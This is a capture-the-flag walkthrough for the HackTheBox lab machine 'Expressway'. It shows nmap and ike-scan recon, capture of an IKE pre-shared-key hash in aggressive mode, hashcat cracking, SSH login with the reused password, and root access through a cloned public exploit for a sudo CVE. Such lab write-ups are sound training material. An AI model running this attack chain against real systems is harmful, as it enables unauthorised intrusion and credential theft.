---
title: HTB - Expressway Notes
date: 2025-12-24
tags:
  - hackthebox
  - pentesting
  - easy
  - ISAKMP
  - ike
  - nmap
  - ike-scan
  - suid
  - guide
  
---
IP : 10.10.11.87

## Recon 

Assign IP to the target variable for ease of use.
```bash
export target=10.10.11.87
```
Conduct an initial nmap survey.
```bash
nmap $target -sS -sV -n -p-

Nmap scan report for 10.10.11.87
Host is up (0.026s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.74 seconds

```

Hmm. There seems to be an open SSH port. Surely it's got authentication set up?  It does.

Gonna try the same, with UDP this time and only top 100 ports because we haven't got all day! Although even this will take a good 20 minutes... so instead I'll use some common port numbers.

```bash
nmap $target -sU -p 53,67,68,69,123,161,162,500,520,1900,3478,4500,5060,27015,27960
```

```bash
Nmap scan report for 10.10.11.87
Host is up (0.029s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   closed        ntp
161/udp   closed        snmp
162/udp   closed        snmptrap
500/udp   open          isakmp
520/udp   closed        route
1900/udp  closed        upnp
3478/udp  closed        stun
4500/udp  open|filtered nat-t-ike
5060/udp  open|filtered sip
27015/udp open|filtered halflife
27960/udp closed        quake3

```
Much better. Some more results...

Out of these, port 500 seems to be the most interesting as it is open. Doing some research, I can see that ISAKMP is a IPSec protocol used for defining how key exchange should take place.

After some research, there appears to be a vulnerability in part of the protocol that handles IKEv1. Let's see if nmap has any NSE's for this.

```bash
nmap $target -sU -p 500 -sC
```

``` bash 
Host is up (0.026s latency).

PORT    STATE SERVICE
500/udp open  isakmp
| ike-version: 
|   attributes: 
|     XAUTH
|_    Dead Peer Detection v1.0
```

Also a scan using the `ike-scan` tool that I didn't know existed!

Lets go nuclear and use the aggressive option.

```bash
ike-scan $target --aggressive
```

``` bash
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87     Aggressive Mode Handshake returned HDR=(CKY-R=a4b1c90e97dcf31f) SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800) KeyExchange(128 bytes) Nonce(32 bytes) ID(Type=ID_USER_FQDN, Value=ike@expressway.htb) VID=09002689dfd6b712 (XAUTH) VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) Hash(20 bytes)

```

To explain the above: 
- ` ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)` - This is how a peer (client) is identified. This is possibly the most interesting part about this data "blob"

### IKE / Internet Security Association and Key Management Protocol

A protocol used in the initial set up of an IPSec tunnel. A ISAKMP SA (secure associations) tunnel is formed between peers to protect negotiation messages. In this phase a suite of information is passed to and throw before the transfer method is agreed upon.

ISAKMP packets contain various information needed to establish a tunnel:

![[isakmp-packets.png]]


## Vulnerability 

So. Now that we know the target is running vulnerable, how can we exploit this?

The normal method of using IKEv1 is in Main Mode (MM). That means all negotiations that happen before the main IPSec tunnel is formed are done via encryption. However, the machine we're trying to access is configured and available to us in aggressive mode (AM). Communications done in AM are done in the clear and the purpose of this was for quicker connections but, luckily for us, at the expense of confidentiality.

A probe to the machine, in AM mode, exposes the pre-shared key hash (PSK).

``` bash
ike-scan -M -A --pskcrack=hash.txt $target
```

For the crack we need to find the mode ID. I use a simple grep of IKE in the hashcat mode page for this and identify 5400 as the needed mode.

```bash
hashcat -hh | grep IKE 
```

```
   5300 | IKE-PSK MD5                                                | Network Protocol
   5400 | IKE-PSK SHA1     
```

Now, using a normal dictionary attack, we try and crack using hashcat.

```bash
hashcat -a 0 -m 5400 hash.txt .usr/share/seclists/Passwords/Leaked-Databases/rocyou.txt
```

And its cracked...

```bash
...003000180040002800b0001000c000400007080:03000000696b6540657870726573737761792e68:8cda621f2d74d0eec9c7975eee1a0330c42d1781:f985134ac25463f98700bbc6f504ee0b4f7e13c481c0ff9d425d9218aa958d0f:65c9f6bded6a58265c064b6c0596c40ab084424e:freakingrockstarontheroad

```

What's the likelyhood that this is the same password for the ssh and the matching ID from earlier?

```bash
ssh ike@$target 
# ike:freakingrockstarontheroad
```

And in the home directory is the flag!

Next up is finding root.

Normal stuff...

```bash
sudo -l
```

Nothing.

Looking for SUIDs.

``` bash
find / -perm -u=s -type f 2>/dev/null
```

```
/usr/sbin/exim4
/usr/local/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/sudo
/usr/bin/umount
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
```

Rather interestingly, there are two sudo binaries... one appears to be custom made.

Looking at users and groups, there's one 2 groups and one user.

```bash
# Groups
ike proxy
```

This may suggest a proxy running on the machine.

However, this alternative sudo bin looks interesting...

``` bash
sudo --version
```

```
Sudo version 1.9.17
Sudoers policy plugin version 1.9.17
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.17
Sudoers audit plugin version 1.9.17
```

A quick google search reveals that this version is vulnerable to CVE-2025-32463 and there is a convenient script on GitHub to exploit this.

https://github.com/r3dBust3r/CVE-2025-32463
``` bash
# clone the repo
git clone https://github.com/r3dBust3r/CVE-2025-32463.git
cd CVE-2025-32463

# make the exploit script executable
chmod +x ./CVE-2025-32463

# run the exploit (only on authorized/test systems)
./CVE-2025-32463
```

And just like that...

```
whoami
root
```

With the final flag in /root.

![[htb-expressway-achievement.png]]